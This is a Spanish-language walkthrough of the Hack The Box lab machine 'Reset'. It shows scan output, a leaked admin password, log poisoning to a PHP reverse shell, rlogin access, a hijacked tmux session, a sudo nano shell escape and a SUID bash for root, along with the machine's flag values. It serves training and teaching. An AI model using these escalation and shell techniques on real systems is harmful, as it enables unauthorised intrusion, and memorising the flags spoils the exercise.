---
tags:
title: Reset- Easy (HTB)
permalink: /Reset-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash
 nmap -sCV -p22,80,512,513,514 10.129.234.130
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-05 15:27 -0500
Nmap scan report for 10.129.234.130
Host is up (2.3s latency).

PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 6a:16:1f:c8:fe:fd:e3:98:a6:85:cf:fe:7b:0e:60:aa (ECDSA)
|_  256 e4:08:cc:5f:8e:56:25:8f:38:c3:ec:df:b8:86:0c:69 (ED25519)
80/tcp  open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-title: Admin Login
512/tcp open  exec?
513/tcp open  login?
514/tcp open  shell?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 332.07 seconds
```

## Website 

En la pagina hay un panel de login.

![image-center](/assets/images/Pasted image 20260205172820.png)
### Plain text password

Sin credenciales seleccione la opción `Forgot Password?`.

![image-center](/assets/images/Pasted image 20260205172955.png)

Interceptando la misma solicitud para el mismo usuario, veo que enviando de nuevo la petición, se ve en texto plano la password del usuario `admin`.

![image-center](/assets/images/Pasted image 20260205173028.png)

![image-center](/assets/images/Pasted image 20260205173044.png)

## Shell as www-data
### Log poisoning

En el panel principal, me deja ver el contenido de archivos de `log`. Intentando ver el contenido del `access.log` de apache veo que tengo exito.

![image-center](/assets/images/Pasted image 20260205175054.png)
### Shell

Por lo que envenene el `log` con una reverse shell de `php`.

![image-center](/assets/images/Pasted image 20260205180424.png)

Luego de enviarla, veo que después de uno segundos recibo la shell como el usuario `www-data`.

```bash
nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.234.130] 35916
whoami
www-data
```

```bash
www-data@reset:/home/sadm$ ls
user.txt
www-data@reset:/home/sadm$ cat user.txt
19ba954c8ba8400cbfc0277f5f1669a4
```
## Shell as sadm
### rlogin

Simplemente para ganar acceso como el usuario `sadm`, cree en mi maquina al usuario y como el puerto `513` esta abierto que corresponde al servicio de `rlogin`, me puedo conectar.

```bash
adduser sadm
```
### Shell

Para la conexión use el siguiente comando.

```bash
rlogin sadm@10.129.234.130
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-140-generic x86_64)

<SNIP>
sadm@reset:~$
```

## Shell as root
### tmux session

Estando en esta shell, veo que corre un proceso de `tmux` del usuario `sadm`.

```bash
ps aux
<SNIP>
sadm 1001 0.0 0.1 8764 3972 ? Ss 17:38 0:00 tmux new-session -d -s
sadm_session
</SNIP>
```

Para entrar en esta sesión use este comando:

```bash
tmux attach -t sadm_session
```
### Sudo privileges

Viendo los privilegios `sudo` de este usuario veo que puedo usar `nano` en el archivo `/etc/firewall.sh`.

```bash
sadm@reset:~$ sudo -l
Matching Defaults entries for sadm on reset:
    env_reset, timestamp_timeout=-1, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, !syslog

User sadm may run the following commands on reset:
    (ALL) PASSWD: /usr/bin/nano /etc/firewall.sh
    (ALL) PASSWD: /usr/bin/tail /var/log/syslog
    (ALL) PASSWD: /usr/bin/tail /var/log/auth.log
```
### Shell

Para abusar de esto puedo presión `Ctrl R + Ctrl X` y luego spawnear una shell con el comando.

```
reset; sh 1>&0 2>&0
```

De esta manera puedo convertirme en `root`. Para operar mas cómodamente le asigne el bit `SUID` a la bash.

![image-center](/assets/images/Pasted image 20260205182551.png)

Y luego corroboro desde la shell de `sadm`.

```bash
sadm@reset:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1396520 Mar 14  2024 /bin/bash
```

Para convertirme en root use el parámetro `-p` de sudo.

```bash
sadm@reset:~$ bash -p
bash-5.1# id
uid=1001(sadm) gid=1001(sadm) euid=0(root) groups=1001(sadm)
```

```bash
bash-5.1# cat root_279e22f8.txt
7ad6951bcb5a2edaffd7908b013d29b0
```

`~Hapy Hacking.`